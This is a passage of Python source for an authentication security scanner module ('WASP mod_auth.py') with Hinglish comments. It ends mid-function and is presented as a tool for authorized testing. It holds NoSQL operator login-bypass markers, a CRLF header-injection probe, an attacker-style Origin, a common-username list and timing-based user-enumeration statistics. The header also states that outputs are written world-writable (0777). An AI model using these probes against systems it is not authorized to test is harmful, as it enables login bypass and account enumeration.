#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
WASP Module: mod_auth.py  |  Phase 21 - Authentication & Authorization
           (Authz/OAuth/OIDC/MFA/SAML/JWT) ULTRA PRO MAX
=======================================================================================
v23.0.0 FINAL ULTRA PRO MAX (koi ek line ki bhi kami nahi - all to all
techniques: hacking hidden secrets + security bypasses + new & old methods).
v23 additions: Stage W (password-hygiene + stuffing-posture), Stage X
(remember-me persistence + session-property matrix, RoE-gated behavioral),
Stage Y (recovery/KBA census + login sequencing), Stage Z (SSO grant matrix
+ token-binding census + auth header posture) - 4 naye families, 28 kill-
chains, 210+ matrix rows, 54 artifacts, 9 RoE gates (sab default OFF).
Authorized security testing ONLY. Scope firewall + rate limiter + request
budget + evidence + checkpoint sab wasp_core se inherit hote hain, isliye
har census request scope-check, rate-limit aur budget ke andar hi jaati hai.

KYA KARTA HAI
  P21 authentication+authorization ki POORI census karta hai - "MERA app ka
  login/SSO/authz trust kahan tak todta hai?" -> 26 stages (A..Z):

    A. Feedforward + surface    - 18-module feedforward (P2 forms, P5 endpoints,
                                  P7 authz-hints, P8 queue, P10 logout, P11
                                  idor, P12 bypass2, P14 state-writes, P16
                                  uploads, P17 mass-assign, P18 writable,
                                  P19 ws-open, P20 logic_privileged_targets)
                                  + verb/param census + well-known pool
    B. Probe & flow mapping     - read-only GET: forms, CSRF, cookies, JWT,
                                  scheme, transport, redirect target + buckets
                                  (login/reset/mfa/register/oauth) + passive
                                  findings (WP-users/NextAuth/WebAuthn/token-url)
    C. Transport/token passive  - cleartext census, cookie hardening (prefix/
                                  flags/duplicate names), pre-auth JWT harvest,
                                  token entropy offline (shannon+bootstrap CI)
    D. JWT deep offline         - alg inventory, alg=none shape, kid-injection
                                  shape, jku/x5u SSRF shape (documented-only),
                                  weak-HMAC hint, JWKS cache headers, nbf/exp
                                  census + tamper probe (gated, GET-only)
    E. Injection / type oracle  - NoSQL operator, type-confusion, HPP, CT-flip
                                  canary differentials (gated, hard budget)
    F. Enumeration oracle       - user-enum LADDER: status/size/time/body-shape/
                                  error-code + DRF-v2 shape fingerprint +
                                  response-shape classifier (canary identifiers)
    G. Rate-limit + lockout     - throttle census + lockout model classify
                                  (per-IP/per-account/global) + bypass-matrix v2
                                  interleaved + bypass2 auth request-shapes
                                  (17 variants, gated, hard caps)
    H. Reset flow census        - generic-message shape, host-header injection
                                  (gated), per-position token entropy + Hamming,
                                  token-in-URL transport, policy inference
    I. MFA deep census          - OTP field shapes, OTP entropy, status/JSON
                                  oracle, replay shape (gated 2-sequential),
                                  backup-code space census, MFA-fatigue signals
                                  (documented-only)
    J. OAuth/OIDC deep          - discovery doc, endpoint census, PKCE shape,
                                  state/nonce validation shape, response_type/
                                  scope census, id_token offline decode (aud/
                                  azp/nonce), JWKS headers, error-shape oracle
    K. OAuth variant census     - redirect_uri allowlist shape: same-host
                                  traversal, subdomain canary, protocol-downgrade,
                                  param-chaining (gated, canary-only, cap 6)
    L. SAML surface             - SP/IdP metadata, ACS census, XSW signature-
                                  wrapping playbook (documented-only)
    M. Authz matrix             - horizontal differential (canary identifiers),
                                  vertical pre-auth census on privileged paths
                                  (P20 logic_privileged_targets + P11 idor),
                                  role-param echo (gated)
    N. Header trust census      - X-Forwarded-For / X-Original-URL / X-Rewrite-
                                  URL / Host-path canary echo (read-only)
    O. CORS + redirect          - Origin echo/reflection suborigin/canary,
                                  open-redirect + reflection + CRLF census
    P. Registration census      - policy inference + duplicate-registration
                                  oracle + pre-account-takeover shape (gated)
    Q. Token lifecycle          - refresh endpoint shape, remember-me entropy,
                                  logout state census, session-fixation shape
    R. Policy + anti-auto       - password-policy inference + CAPTCHA/anti-
                                  automation census (marker shapes)
    S. Verdict engine           - sab signals -> 6-class ladder rows
                                  (CONFIRMED/SUSPECTED/HARDENED/NOISE/INFO/GATED)
    T. Kill-chains              - 24 auth-specific chains (CH01..CH24) +
                                  cross-module chain census
    U. Technique matrix         - 150+ rows x 20 columns (22 families)
    V. Defense + reports        - defense score, auth state machine, feedforward
                                  handoff (P22/P23/P25/P11/P12/P9), manifest 40+,
                                  exec summary + findings/test-plan/remediation/
                                  kickoff/playbooks reports
    W. Password hygiene v23     - per-form password-hygiene matrix (policy hint +
                                  autocomplete + maxlength + cleartext-post) +
                                  credential-stuffing posture composite (0-req)
    X. Remember-me v23          - persistent-cookie census (name/lifetime/flags)
                                  + session-property matrix (Secure/HttpOnly/
                                  SameSite/prefix/scope) + RoE-gated 2-GET
                                  persistence shape (canary-only)
    Y. Recovery + sequence v23  - recovery/KBA/security-question surface census
                                  (documented playbook) + login-flow sequencing
                                  census (redirect-chain shapes)
    Z. SSO grants + binding v23 - OAuth grant-type x response-mode matrix +
                                  SAML binding matrix (0-req offline) + token-
                                  binding/DPoP/mTLS indicator census + auth
                                  header-posture matrix (HSTS/CSP/COOP/CORP)

SAFETY MODEL (unchanged):
  * 100% INERT detection-only - koi lockout trigger nahi, koi account create/
    delete nahi, koi email trigger nahi (RoE-gated census canary-only)
  * RoE gates: sab state-changing / auth-sensitive probes default OFF
    (config.json me auth_allow_* = true karke hi khulte hain)
  * v23 naye RoE gates (default OFF): auth23_allow_rememberme_probe,
    auth23_allow_recovery_probe, auth23_allow_sequence_probe,
    auth23_allow_binding_probe
  * canary-only identifiers (waspP21 family) - koi REAL user enum nahi
  * zero egress - sab variants same-origin canary shapes
  * outputs RWX 0777 (wasp_core save_* inherit)
=======================================================================================
"""
import os
import re
import sys
import json
import math
import time
import random
import base64
import urllib.parse

# --- WASP v2.2 standalone path fix (auto-inserted) ---
_wasp22_dir = os.path.dirname(os.path.abspath(__file__))
if _wasp22_dir not in sys.path:
    sys.path.insert(0, _wasp22_dir)
_wasp22_p = _wasp22_dir
while _wasp22_p != os.path.dirname(_wasp22_p):
    _wasp22_p = os.path.dirname(_wasp22_p)
    if os.path.exists(os.path.join(_wasp22_p, "wasp_core.py")):
        if _wasp22_p not in sys.path:
            sys.path.insert(0, _wasp22_p)
        break
# --- end WASP v2.2 fix ---

try:
    from wasp_core import (Cfg, Scope, ScopeError, Evidence, HttpClient, Checkpoint,
                           outdir_for, now_iso, save_json, save_text, load_json, rand_str,
                           shannon_entropy, sha1, host_of, median, mad, robust_z,
                           truncate, redact, module_ctx, write_feedforward,
                           write_manifest, info, ok, warn, err, head, C, VERSION)
except ImportError:
    print("[-] wasp_core.py isi folder me hona chahiye (wasp_core.py not found).")
    sys.exit(1)

NAME = "auth"
PHASE = "21-authentication-authz"
PLAN_VERSION = "23.0.0"

DEFAULTS = {
    # v1 se compatible keys
    "auth_max_attempts": 6,
    "auth_timing_repeats": 3,
    "auth_bypass_probes": 4,
    "auth_reset_token_samples": 5,
    "auth_allow_registration_probe": False,
    "auth_allow_reset_probe": True,
    "auth_allow_heuristic_enum": True,
    # naye knobs (v9)
    "auth_surface_cap": 25,                    # max auth endpoints probed
    "auth_enum_identifiers": 5,                # plausible identifiers per endpoint
    "auth_use_phase8_priority": True,          # Phase 8 queue se targeting
    "auth_allow_reset_plausible_probe": False, # real users ko email na jaye
    "auth_allow_token_tamper_probe": True,     # JWT signature/alg=none (GET only)
    "auth_csrf_token_samples": 2,              # sessions for CSRF binding test
    "auth_stats_bootstrap": 400,               # bootstrap resamples
    "auth_stats_alpha": 0.05,                  # significance level
    "auth_allow_method_matrix": True,          # OPTIONS/HEAD (read-only) probing
    # v10 ULTRA PRO MAX knobs
    "auth_allow_injection_oracle": True,       # NoSQL/type-confusion/HPP/CT probes
    "auth_inject_probes": 10,                  # hard cap injection-oracle requests
    "auth_allow_cors_probe": True,             # Origin echo probe on auth endpoints
    "auth_cors_endpoints": 3,                  # kitne endpoints par CORS probe
    "auth_allow_redirect_probe": True,         # open-redirect + reflection + CRLF
    "auth_redirect_endpoints": 2,              # kitne login/reset endpoints par
    "auth_allow_header_poison": True,          # reset per-header poisoning variants
    "auth_allow_oauth_variants": True,         # redirect_uri path-traversal variant
    "auth_oauth_probes": 4,                    # max authorization-endpoint probes
    "auth_allow_reflection_probe": True,       # benign marker reflection check
}

# Reserved, never-routable TLD -> synthetic identifiers ke liye

SYNTH_DOMAIN = "wasp-invalid.test"

WELL_KNOWN_AUTH = [
    "/login", "/signin", "/sign-in", "/log-in", "/auth/login", "/api/login",
    "/api/auth/login", "/api/v1/auth/login", "/api/v2/auth/login", "/admin/login",
    "/user/login", "/account/login", "/session/new", "/j_security_check",
    "/register", "/signup", "/sign-up", "/auth/register", "/api/register",
    "/api/auth/signup", "/api/v1/register", "/account/create", "/users/new",
    "/forgot", "/forgot-password", "/password/forgot", "/password/reset",
    "/reset", "/reset-password", "/auth/forgot", "/api/auth/forgot",
    "/api/password/reset", "/account/recover", "/users/password/new",
    "/mfa", "/2fa", "/otp", "/verify", "/verify-otp", "/auth/mfa", "/auth/otp",
    "/totp", "/challenge", "/auth/verify",
    "/logout", "/signout", "/auth/logout",
    "/oauth/authorize", "/oauth/token", "/oauth2/authorize", "/connect/authorize",
    "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
    "/saml/login", "/saml2/login", "/saml/metadata", "/saml/metadata.xml",
    "/api/auth/session", "/api/auth/me", "/api/me",
    # v10 ULTRA PRO MAX: modern-stack discovery (NextAuth/Auth.js, JWKS, WordPress)
    "/jwks.json", "/.well-known/jwks.json", "/oauth/jwks.json",
    "/api/auth/providers", "/api/auth/csrf", "/api/auth/providers/auth0",
    "/wp-login.php", "/wp-json/wp/v2/users", "/api/users/me", "/auth/check",
]

AUTH_PATH_RE = re.compile(
    r"(?i)(/|_)(login|log-?in|signin|sign-?in|logout|signout|sign-?out|auth|authenticate|"
    r"authorize|authorization|session|sessions|register|signup|sign-?up|account/create|"
    r"password|passwd|forgot|reset|recover|mfa|2fa|otp|totp|verify|verification|"
    r"challenge|token|jwt|oauth|oidc|saml|sso|credential|apikey|api-?key|"
    r"j_security_check|users/password)")

LOGIN_HINT_RE = re.compile(r"(login|log-?in|signin|sign-?in|authenticate|session|j_security)", re.I)

RESET_HINT_RE = re.compile(r"(forgot|reset|recover|passwd|password)", re.I)

MFA_HINT_RE = re.compile(r"(mfa|2fa|otp|totp|verify|challenge|second[-_]?factor)", re.I)

REGISTER_HINT_RE = re.compile(r"(register|signup|sign-?up|create[-_]?account|account/create|users/new)", re.I)

OAUTH_HINT_RE = re.compile(r"(oauth|oidc|openid|saml|sso|authorize)", re.I)

SESSION_CHECK_RE = re.compile(r"(me$|whoami|session|profile|current[-_]?user|auth/status)", re.I)

# v10 ULTRA PRO MAX constants

REDIRECT_PARAMS = ("next", "return", "returnto", "return_to", "redirect", "redirect_uri",
                   "redirecturl", "redirect_url", "url", "goto", "go", "continue",
                   "continueurl", "target", "dest", "destination", "rurl", "rurl2",
                   "callback", "callbackurl", "forward", "link", "relaystate")

REDIRECT_PARAM_RE = re.compile(
    r"(?i)^(next|return|returnto|return_to|redirect|redirect_uri|redirecturl|redirect_url|"
    r"url|goto|go|continue|continueurl|target|dest|destination|rurl|callback|callbackurl|"
    r"forward|relaystate)$")

WEBAUTHN_RE = re.compile(
    r"(?i)(webauthn|navigator\.credentials|passkey[s]?|fido2?|publickey-credential|"
    r"platformauthenticator|authenticatorselection)")

CAPTCHA_RE = re.compile(r"(?i)(recaptcha|hcaptcha|turnstile|captcha|geetest|funcaptcha)")

NO_STORE_RE = re.compile(r"(?i)(no-store|private|max-age\s*=\s*0)")

CDN_HEADER_RE = re.compile(r"(?i)^(x-cache|x-varnish|x-drupal-cache|x-served-by|x-fastly-request-id|"
                           r"cf-cache-status|x-amz-cf-id|x-vercel-cache|x-proxy-cache|age|via)$")

JWT_URL_RE = re.compile(r"(?i)[?&](token|jwt|access_token|id_token|auth)=")

SAML_RE = re.compile(r"(?i)(samlrequest|samlresponse|samlmetadata|acsurl|entityid)")

NEXTAUTH_PATH_RE = re.compile(r"/api/auth/(providers|csrf|session)$")

WP_USERS_RE = re.compile(r"/wp-json/wp/v2/users?$")

INJECT_MARKERS = {"$ne": None, "$gt": "", "$regex": "^a", "$exists": True}

REFLECT_MARKER = "wasp9xq7"

CRLF_PROBE = "wasp%0d%0aX-Wasp-Probe:1"

INVALID_ORIGIN = "https://attacker-invalid.test"

NULL_ORIGIN = "null"

HARDEN_CDN_HINTS = ("x-cache", "cf-cache-status", "x-vercel-cache", "x-served-by", "via")

PLAUSIBLE_USERS = ["admin", "administrator", "root", "support", "info", "test",
                   "user", "guest", "demo", "operator"]

USERNAME_FIELDS = ["username", "user", "userid", "user_id", "email", "e-mail", "login",
                   "loginid", "account", "identifier", "uname", "phone", "mobile", "msisdn"]

PASSWORD_FIELDS = ["password", "pass", "passwd", "pwd", "passphrase", "secret", "pin"]

OTP_FIELDS = ["otp", "code", "token", "pin", "factor", "totp", "otpcode", "verification_code"]

CSRF_FIELDS_RE = re.compile(r"(csrf|xsrf|token|nonce|authenticity|requestverification|_token)", re.I)

FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)

FIELD_RE = re.compile(r"<(input|select|textarea)\b[^>]*>", re.I)

ATTR_RE = re.compile(r"""([A-Za-z_:][-A-Za-z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))""")

TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.I | re.S)

JWT_RE = re.compile(r"\b(eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{0,})")

LOCKOUT_RE = re.compile(
    r"(?i)(too many (failed )?attempts?|account (has been )?lock|temporarily lock|"
    r"try again (later|in \d)|rate limit|slow down|throttl|blocked|captcha|"
    r"security check|unusual activity|suspicious activity|maximum attempts)")

ENUM_MSG_RE = re.compile(
    r"(?i)(user(n[au]me)? (not found|does not exist|doesn'?t exist|unknown|invalid)|"
    r"no such (user|account)|account (not found|does not exist|doesn'?t exist)|"
    r"email (not found|not registered|does not exist)|incorrect password|wrong password|"
    r"invalid password|password (is )?incorrect|already (taken|registered|exists)|"
    r"email already|username (taken|exists))")

GENERIC_MSG_RE = re.compile(
    r"(?i)(invalid (credentials|username or password|login|email or password)|"
    r"login failed|authentication failed|incorrect (username|email) or password|"
    r"unable to (log ?in|sign ?in)|please (check|try again)|check your (email|inbox)|"
    r"if (the )?(account|email) exists|we (have )?sent|instructions have been sent)")

ERROR_KEY_RE = re.compile(r"(?i)^(error|errors|err|code|errorcode|error_code|detail|details|"
                          r"message|msg|reason|status|type|title|field|fieldname|key|description)$")

DEBUG_LEAK_RE = re.compile(r"(?i)(traceback \(most recent call last\)|stack trace|"
                           r"at [a-z0-9_.]+\([A-Za-z0-9_]+\.java:\d+\)|"
                           r"Warning: .* on line \d+|System\.Exception|"
                           r"django\.core\.exceptions|werkzeug\.debug|SQLSTATE\[)")

SEVERITY_HINTS = {
    "no_rate_limit": ("Medium", "CVSS ~5.3", "Credential stuffing aur brute-force ko koi control nahi rokta."),
    "lockout_bypass": ("High", "CVSS ~7.5", "Throttling ko header/identifier mutation se bypass kiya ja sakta hai."),
    "user_enumeration": ("Medium", "CVSS ~5.3", "Valid usernames enumerate ho sakte hain - targeted attacks aasan."),
    "timing_enumeration": ("Low", "CVSS ~3.7", "Response timing account existence leak karti hai."),
    "json_oracle_enumeration": ("Medium", "CVSS ~5.3", "JSON error codes account existence batate hain."),
    "reset_token_weak": ("High", "CVSS ~8.1", "Predictable reset token -> account takeover ka raasta."),
    "reset_host_header_injection": ("High", "CVSS ~7.5", "Host header reset link me reflect hota hai -> token theft."),
    "reset_enumeration": ("Medium", "CVSS ~5.3", "Reset endpoint account existence leak karta hai."),
    "mfa_status_oracle": ("Medium", "CVSS ~5.3", "MFA state status code se leak hota hai."),
    "mfa_no_ratelimit": ("High", "CVSS ~7.5", "OTP verification par rate limit nahi -> OTP brute-force."),
    "mfa_weak_otp_policy": ("Medium", "CVSS ~5.9", "OTP length/format kamzor hai."),
    "registration_enumeration": ("Low", "CVSS ~3.7", "Registration duplicate check account existence leak karta hai."),
    "cookie_flags_missing": ("Medium", "CVSS ~4.3", "Session cookie hardening missing -> session theft."),
    "cookie_prefix_violation": ("Medium", "CVSS ~4.3", "Cookie name prefix (__Host-/__Secure-) ke rules violate hue."),
    "duplicate_cookie_names": ("Medium", "CVSS ~5.4", "Same naam ke multiple cookies -> session fixation/tossing."),
    "preauth_jwt_weak": ("High", "CVSS ~7.5", "Pre-auth JWT me weak alg ya missing expiry."),
    "jwt_alg_none_accepted": ("Critical", "CVSS ~9.1", "alg=none JWT accept hua -> complete auth bypass."),
    "jwt_signature_not_verified": ("Critical", "CVSS ~9.1", "Tampered signature accept hua -> auth bypass."),
    "jwt_sensitive_claims": ("Medium", "CVSS ~5.3", "JWT me privilege claims plaintext me hain."),
    "jwt_kid_injection": ("High", "CVSS ~7.5", "kid/jku header injection ke indicators mile."),
    "cleartext_auth_transport": ("High", "CVSS ~8.1", "Login HTTP par hai -> credentials plaintext me jaate hain."),
    "csrf_token_static": ("Medium", "CVSS ~6.5", "CSRF token session-bound nahi -> cross-session reuse."),
    "csrf_missing": ("Medium", "CVSS ~5.4", "Auth form me CSRF token nahi mila."),
    "weak_auth_scheme": ("Medium", "CVSS ~5.3", "Basic/NTLM jaise weak scheme expose hue."),
    "oauth_redirect_uri_loose": ("High", "CVSS ~7.4", "redirect_uri validation loose -> authorization code theft."),
    "oauth_no_pkce": ("Medium", "CVSS ~5.9", "PKCE support nahi -> public client me code interception."),
    "oauth_implicit_flow": ("Medium", "CVSS ~5.3", "Implicit flow enabled -> token URL fragment me."),
    "oauth_missing_state": ("Medium", "CVSS ~5.3", "Authorization URL me state param nahi -> CSRF."),
    "password_policy_weak": ("Low", "CVSS ~3.1", "Client-side password policy kamzor ya missing."),
    "sensitive_error_disclosure": ("Low", "CVSS ~3.7", "Auth endpoint stack trace/debug info leak karta hai."),
    "registration_open": ("Info", "-", "Registration khula hai - attack surface note karo."),
    # ---- v10 ULTRA PRO MAX findings ----
    "nosql_operator_accepted": ("Critical", "CVSS ~9.1",
                                "NoSQL operator ($ne/$gt) login bypass de sakta hai - auth logic operator query ko value maan rahi hai."),
    "json_type_confusion_signal": ("Medium", "CVSS ~5.9",
                                   "JSON types (null/list/int) par login endpoint ka behaviour badalta hai - type-juggling bypass ka indicator."),
    "hpp_response_diff": ("Low", "CVSS ~3.7",
                          "Parameter pollution se response badalta hai - parser confusion hai, WAF/auth rules dodge ho sakte hain."),
    "content_type_behavior_diff": ("Low", "CVSS ~3.7",
                                   "Form vs JSON body par endpoint alag behave karta hai - validation bypass ka raasta."),
    "cors_cred_reflection": ("High", "CVSS ~7.5",
                             "Arbitrary Origin reflect hota hai credentials ke saath - koi bhi site authenticated data padh sakti hai."),
    "cors_wildcard": ("Medium", "CVSS ~5.4",
                      "Access-Control-Allow-Origin: * auth endpoint par - public data leak (credentials ke saath to Critical)."),
    "auth_clickjacking": ("Low", "CVSS ~3.7",
                          "Login page framing se bacha nahi - login-CSRF/UI-redress possible."),
    "auth_response_cacheable": ("Medium", "CVSS ~4.3",
                                "Auth page cache-control ke bina serve hota hai + CDN hints - shared cache me sensitive data cache ho sakta hai."),
    "password_autocomplete_on": ("Info", "-",
                                 "Password field par autocomplete on hai - shared systems par risk (policy note)."),
    "auth_open_redirect": ("Medium", "CVSS ~6.1",
                           "Login/reset redirect param externally-controlled redirect karta hai - phishing + token leak chain."),
    "auth_reflected_input": ("Medium", "CVSS ~5.4",
                             "Auth page query input ko reflect karta hai - pre-auth XSS candidate (manual confirm karo)."),
    "crlf_injection_auth": ("High", "CVSS ~7.5",
                            "CRLF sequence response headers me inject hua - response splitting / session fixation."),
    "reset_token_disclosure": ("Critical", "CVSS ~9.1",
                               "Password-reset token HTTP response me visible hai - MITM/proxy/logs se ATO."),
    "reset_header_poison_extended": ("High", "CVSS ~7.5",
                                     "X-Original-URL/X-Forwarded-* se reset link poison hua - host-header ATO chain."),
    "jwt_key_injection_headers": ("High", "CVSS ~7.5",
                                  "JWT header me jku/x5u/x5c/jwk URL hai - server attacker-controlled key ya SSRF accept kar sakta hai."),
    "jwt_duplicate_claims": ("Medium", "CVSS ~5.9",
                             "JWT payload me duplicate claims hain - parser discrepancy ke saath privilege confusion possible."),
    "jwt_long_lived": ("Low", "CVSS ~3.7",
                       "Pre-auth token ki validity bahut lambi hai (24h+) - theft window bada."),
    "jwt_hs256_confusion_candidate": ("Medium", "CVSS ~5.9",
                                      "RS256 token + public JWKS endpoint - HS256 key-confusion offline try karo (wasp_config bypass jwt)."),
    "oauth_pkce_downgrade_surface": ("Low", "CVSS ~3.7",
                                     "PKCE optional lag raha hai - public client me downgrade/code-interception ka surface."),
    "oauth_mixup_indicator": ("Medium", "CVSS ~5.9",
                              "Ek se zyada issuer/authorization endpoint mila - mix-up attack ka surface."),
    "saml_surface_detected": ("Info", "-",
                              "SAML endpoints/metdata mile - SAML-specific attacks (wrapper/signature wrapping) manual phase me."),
    "nextauth_surface": ("Info", "-",
                         "NextAuth/Auth.js endpoints mile - provider disclosure + v4 endpoint quirks check karo."),
    "wordpress_users_exposed": ("Medium", "CVSS ~5.3",
                                "WP REST /users endpoint usernames dump karta hai - enumeration + password spraying feed."),
    "webauthn_detected": ("Info", "-",
                          "WebAuthn/passkeys detect hue - downgrade/registration-bypass flows manual check karo."),
    "brute_force_defense_weak": ("Medium", "CVSS ~5.3",
                                 "Login defense composite score kamzor hai - credential stuffing ka easy target."),
    "token_in_url_transport": ("Low", "CVSS ~3.1",
                               "Token query string me jaata hai - Referer/browser history/proxy logs me leak."),
}

def classify_severity(key):
    return SEVERITY_HINTS.get(key, ("Info", "-", ""))


# ---------------------------------------------------------------------------
# MODULE STATE
# ---------------------------------------------------------------------------
class Findings:
    def __init__(self):
        self.items = []

    def add(self, key, title, endpoint, detail, evidence_ref="", extra=None):
        sev, cvss, why = classify_severity(key)
        rec = {"id": "AUTH-%03d" % (len(self.items) + 1), "key": key, "title": title,
               "severity": sev, "cvss_hint": cvss, "endpoint": endpoint,
               "detail": detail, "why_it_matters": why,
               "evidence": evidence_ref, "ts": now_iso()}
        if extra:
            rec.update(extra)
        self.items.append(rec)
        return rec


# ---------------------------------------------------------------------------
# PURE HELPERS (unit-testable, koi network nahi)
# ---------------------------------------------------------------------------

def attrs_of(tag):
    out = {}
    for m in ATTR_RE.finditer(tag or ""):
        name = m.group(1).lower()
        val = (m.group(2) if m.group(2) is not None
               else (m.group(3) if m.group(3) is not None else (m.group(4) or "")))
        out[name] = val
    return out

def parse_forms(html, base_url=""):
    """HTML se forms + fields nikalo. Pure function."""
    forms, html = [], (html or "")
    for fm in FORM_RE.finditer(html):
        end = html.find(">", fm.start())
        head_tag = html[fm.start():end + 1] if end != -1 else fm.group(0)
        a = attrs_of(head_tag)
        action = urllib.parse.urljoin(base_url, a.get("action") or base_url)
        method = (a.get("method") or "get").upper()
        fields = []
        for im in FIELD_RE.finditer(fm.group(1)):
            ia = attrs_of(im.group(0))
            fname = ia.get("name", "")
            if not fname:
                continue
            fields.append({"name": fname,
                           "type": (ia.get("type") or im.group(1).lower()).lower(),
                           "value": ia.get("value", ""),
                           "maxlength": ia.get("maxlength", ""),
                           "pattern": ia.get("pattern", ""),
                           "autocomplete": ia.get("autocomplete", ""),
                           "required": "required" in im.group(0).lower()})
        forms.append({
            "action": action, "method": method, "enctype": a.get("enctype", ""),
            "field_names": [f["name"] for f in fields],
            "has_password": any(f["type"] == "password" for f in fields),
            "password_count": sum(1 for f in fields if f["type"] == "password"),
            "csrf_fields": [f["name"] for f in fields if CSRF_FIELDS_RE.search(f["name"])],
            "fields": fields,
        })
    return forms

def guess_fields(field_names):
    """Kaunsa field identifier hai aur kaunsa password - guess karo."""
    user_f, pass_f = None, None
    for n in field_names or []:
        ln = n.lower()
        if pass_f is None and any(p in ln for p in PASSWORD_FIELDS):
            pass_f = n
        if user_f is None and any(u in ln for u in USERNAME_FIELDS):
            user_f = n
    return user_f, pass_f

def guess_otp_field(field_names):
    for n in field_names or []:
        if any(o in n.lower() for o in OTP_FIELDS):
            return n
    return (field_names or ["otp"])[0]

def title_of(html):
    m = TITLE_RE.search(html or "")
    return re.sub(r"\s+", " ", m.group(1)).strip() if m else ""

def synth_identifier(kind="nonexistent"):
    """Reserved TLD par synthetic identifier - real domain ko chhoota hi nahi."""
    return "wasp-%s-%s@%s" % (kind, rand_str(6), SYNTH_DOMAIN)


# ---------------------------------------------------------------------------
# STATISTICS (pure python; numpy/scipy ki zaroorat nahi)
# ---------------------------------------------------------------------------

def shingle_sim(a, b, k=4):
    """Character-shingle Jaccard. 1.0 = identical."""
    def sh(s):
        s = re.sub(r"\s+", " ", s or "")
        return set(s[i:i + k] for i in range(max(0, len(s) - k + 1)))
    A, B = sh(a), sh(b)
    if not A and not B:
        return 1.0
    if not A or not B:
        return 0.0
    return len(A & B) / float(len(A | B))

def mean(xs):
    xs = [x for x in xs if x is not None]
    return sum(xs) / len(xs) if xs else 0.0

def variance(xs):
    xs = [x for x in xs if x is not None]
    n = len(xs)
    if n < 2:
        return 0.0
    m = mean(xs)
    return sum((x - m) ** 2 for x in xs) / (n - 1)

def welch_t(a, b):
    """Welch t-test -> (t, approx_df). Equal variance assume nahi karta."""
    a = [x for x in a if x is not None]
    b = [x for x in b if x is not None]
    na, nb = len(a), len(b)
    if na < 2 or nb < 2:
        return 0.0, 0.0
    va, vb = variance(a), variance(b)
    denom = math.sqrt(va / na + vb / nb)
    if denom <= 0:
        return 0.0, 0.0
    t = (mean(a) - mean(b)) / denom
    num = (va / na + vb / nb) ** 2
    den = (va / na) ** 2 / (na - 1) + (vb / nb) ** 2 / (nb - 1)
    df = num / den if den > 0 else 0.0
    return t, df

def mannwhitney_u(a, b):
    """Rank-sum U + normal approximation p-value (tie-corrected)."""
    a = [x for x in a if x is not None]
    b = [x for x in b if x is not None]
    na, nb = len(a), len(b)
    if na == 0 or nb == 0:
        return 0.0, 1.0, 0.0
    pool = [(x, 0) for x in a] + [(x, 1) for x in b]
    pool.sort(key=lambda p: p[0])
    ranks, i, tie_corr = [0.0] * len(pool), 0, 0.0
    while i < len(pool):
        j = i
        while j + 1 < len(pool) and pool[j + 1][0] == pool[i][0]:
            j += 1
        avg = (i + j) / 2.0 + 1.0
        for k in range(i, j + 1):
            ranks[k] = avg
        if j > i:
            tie_corr += (j - i + 1) ** 3 - (j - i + 1)
        i = j + 1
    ra = sum(ranks[k] for k in range(len(pool)) if pool[k][1] == 0)
    ua = ra - na * (na + 1) / 2.0
    ub = na * nb - ua
    u = min(ua, ub)
    mu = na * nb / 2.0
    n = na + nb
    sigma = math.sqrt((na * nb / 12.0) * ((n + 1) - tie_corr / float(n * (n - 1) or 1)))
    if sigma <= 0:
        return u, 1.0, 0.0
    z = (u - mu) / sigma
    p = math.erfc(abs(z) / math.sqrt(2.0))
    return u, min(1.0, p), z

def cliffs_delta(a, b):
    """Effect size: -1..1. |d|>=0.474 = large, >=0.33 medium, >=0.147 small."""
    a = [x for x in a if x is not None]
    b = [x for x in b if x is not None]
    if not a or not b:
        return 0.0
    gt = lt = 0
    for x in a:
        for y in b:
            if x > y:
                gt += 1
            elif x < y:
                lt += 1
    return (gt - lt) / float(len(a) * len(b))

def cliffs_label(d):
    ad = abs(d)
    return "large" if ad >= 0.474 else "medium" if ad >= 0.33 else "small" if ad >= 0.147 else "negligible"

def bootstrap_median_ci(a, b, resamples=400, alpha=0.05, rng=None):
    """Median difference ka bootstrap CI (deterministic seed)."""
    a = [x for x in a if x is not None]
    b = [x for x in b if x is not None]
    if len(a) < 2 or len(b) < 2:
        return None
    rng = rng or random.Random(1337)
    diffs = []
    for _ in range(int(resamples)):
        sa = [a[rng.randrange(len(a))] for _ in range(len(a))]
        sb = [b[rng.randrange(len(b))] for _ in range(len(b))]
        diffs.append(median(sa) - median(sb))
    diffs.sort()
    lo = diffs[int((alpha / 2) * len(diffs))]
    hi = diffs[min(len(diffs) - 1, int((1 - alpha / 2) * len(diffs)))]
    return {"median_diff": round(median(diffs), 6), "ci_low": round(lo, 6),
            "ci_high": round(hi, 6), "excludes_zero": (lo > 0 or hi < 0),
            "resamples": int(resamples)}

def jittered_values(xs, rng=None):
    """Tied values ko halka jitter do -> rank tests ko help karta hai."""
    rng = rng or random.Random(4242)
    return [x + rng.uniform(-1e-6, 1e-6) for x in xs]

def timing_verdict(plausible, bogus, alpha=0.05, resamples=400):
    """
    Ek hi jagah saare timing tests. Ye v1 ke 'sirf MAD z-score' se aage hai:
      * Welch t-test  -> mean shift
      * Mann-Whitney U -> rank shift (outlier-robust)
      * Cliff's delta -> effect size (practical significance)
      * bootstrap CI  -> median difference ka confidence interval
    """
    p = [x for x in plausible if x is not None]
    b = [x for x in bogus if x is not None]
    out = {"n_plausible": len(p), "n_bogus": len(b),
           "median_plausible_ms": round(median(p) * 1000, 1) if p else None,
           "median_bogus_ms": round(median(b) * 1000, 1) if b else None}
    if len(p) < 2 or len(b) < 2:
        out["verdict"] = "insufficient-samples"
        return out
    med_b = median(b)
    m_b = mad(b, med_b)
    z = robust_z(median(p), med_b, m_b) if m_b > 0 else 0.0
    t, df = welch_t(p, b)
    u, pu, uz = mannwhitney_u(jittered_values(p), jittered_values(b))
    d = cliffs_delta(p, b)
    ci = bootstrap_median_ci(p, b, resamples=resamples)
    out.update({"robust_z": round(z, 2), "welch_t": round(t, 3), "welch_df": round(df, 1),
                "mw_u": round(u, 2), "mw_p": round(pu, 5), "mw_z": round(uz, 3),
                "cliffs_delta": round(d, 3), "cliffs_size": cliffs_label(d),
                "median_diff_ms": round((median(p) - med_b) * 1000, 1),
                "bootstrap": ci})
    sig = (pu < alpha) or (abs(z) > 3.5)
